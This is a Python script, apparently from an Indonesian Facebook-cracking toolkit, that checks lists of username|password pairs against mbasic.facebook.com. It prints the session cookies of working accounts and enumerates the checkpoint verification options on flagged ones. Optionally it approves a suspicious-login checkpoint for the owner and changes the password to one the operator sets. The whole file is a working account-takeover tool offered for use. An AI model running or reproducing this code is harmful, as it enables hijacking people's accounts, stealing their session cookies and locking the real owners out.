import requests as req,re
from bs4 import BeautifulSoup as par

"""
   ______     __      ____             _ 
  / ____/__  / /__   / __ \____  _____(_)
 / /   / _ \/ //_/  / / / / __ \/ ___/ / Recode By: Arya Adinata
/ /___/  __/ ,<    / /_/ / /_/ (__  ) / https://github.com/Avos-Dilhevia
\____/\___/_/|_|   \____/ .___/____/_/   
                       /_/               
	Cek Opsi Checkpoint Facebook
	
"""
#data - data
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,pwBaru=[],[]

class Main(object):
	
	def __init__(self,url,file):
		self.url = url
		self.file(file)
	def file(self,file):
		ww=input("[?] Ubah pw ketika tap yes [y/t]: ")
		if ww in ("y","ya"):
			ubahP.append("y")
			pwBar=input("[+] Masukan pw baru: ")
			if len(pwBar) <= 5:
				exit("Password harus lebih dari 6 character!")
			else:
				pwBaru.append(pwBar)
		else:
			print("> Skipped")
		print("[✓] Jumlah akun:",len(file),f"\n{'='*45}\n")
		for data in file:
			data = data.replace("\n","")
			user,pw = data.split("|")
			self.user = user
			self.pw = pw
			print(f"[+] Check : {self.user} | {self.pw}")
			self.cek_opsi()

class Eksekusi(Main):
	
	def cek_opsi(self):
		global aman,cp,salah
		session=req.Session()
		session.headers.update({
			"Host":"mbasic.facebook.com",
			"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"accept-encoding":"gzip, deflate",
			"accept-language":"id-ID,id;q=0.9",
			"referer":"https://mbasic.facebook.com/",
			"user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
		})
		soup=par(session.get(self.url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
		link=soup.find("form",{"method":"post"})
		for x in soup("input"):
			data.update({x.get("name"):x.get("value")})
		data.update({"email":self.user,"pass":self.pw})
		urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
		response=par(urlPost.text, "html.parser")
		if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
			print("[!] Nyalakan lalu matikan mode pesawat selama 2 Detik.")
		if "c_user" in session.cookies.get_dict():
			if "Akun Anda Dikunci" in urlPost.text:
				print(f"\r[×] Akun sesi new					\n\n",end="")
			else:
				aman+=1
				print(f"\r[√] Akun Aman\n[=] Cookie: {''.join(session.cookies.get_dict())}				\n\n",end="")
		elif "checkpoint" in session.cookies.get_dict():
			cp+=1
			title=re.findall("\<title>(.*?)<\/title>",str(response))
			link2=response.find("form",{"method":"post"})
			listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
			for x in response("input"):
				if x.get("name") in listInput:
					data2.update({x.get("name"):x.get("value")})
			an=session.post(self.url+link2.get("action"),data=data2)
			response2=par(an.text,"html.parser")
			number=0
			cek=[cek for cek in response2.find_all("option")]
			print(f"\r[!] Terdapat {len(cek)} opsi:\n",end="")
			if(len(cek)==0):
				if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
					coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
					if "y" in ubahP:
						self.ubah_pw(session,response,link2)
					else:
						print(f"\r[√] Akun tap yes\n[=] Cookie: {coki}									\n")
				elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
					print("\r[×] Akun a2f on							\n")
				else:
					print("Kesalahan!")
			elif(len(cek)<=1):
				for x in range(len(cek)):
					number+=1
					opsi=re.findall('\<option selected=\".*?\" value=\".*?\">(.*?)<\/option>',str(cek))
					print(f"\r[{number}]. {''.join(opsi)}							\n\n",end="")
			elif(len(cek)>=2):
				for x in range(len(cek)):
					number+=1
					opsi=re.findall('\<option value=\".+\">(.+)<\/option>',str(cek[x]))
					print(f"\r[{number}]. {''.join(opsi)}							\n",end="")
				print("")
			else:
				if "c_user" in session.cookies.get_dict():
					cp-=1
					aman+=1
					print(f"\r[√] Akun Aman\n[=] Cookie: {''.join(session.cookies.get_dict())}				\n",end="")
					
		else:
			salah+=1
			print("\r[!] Kata sandi salah atau sudah diubah				\n")
	def ubah_pw(self,session,response,link2):
		dat,dat2={},{}
		but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
		for x in response("input"):
			if x.get("name") in but:
				dat.update({x.get("name"):x.get("value")})
		ubahPw=session.post(self.url+link2.get("action"),data=dat).text
		resUbah=par(ubahPw,"html.parser")
		link3=resUbah.find("form",{"method":"post"})
		but2=["submit[Next]","nh","fb_dtsg","jazoest"]
		if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
			for b in resUbah("input"):
				if b.get("name") in but2:
					dat2.update({b.get("name"):b.get("value")})
			dat2.update({"password_new":"".join(pwBaru)})
			an=session.post(self.url+link3.get("action"),data=dat2)
			coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
			print(f"\r[√] Akun tap yes\n[=] Password diubah!\n[=] {self.user} | {''.join(pwBaru)}\n[=] Cookie: {coki}							\n",end="")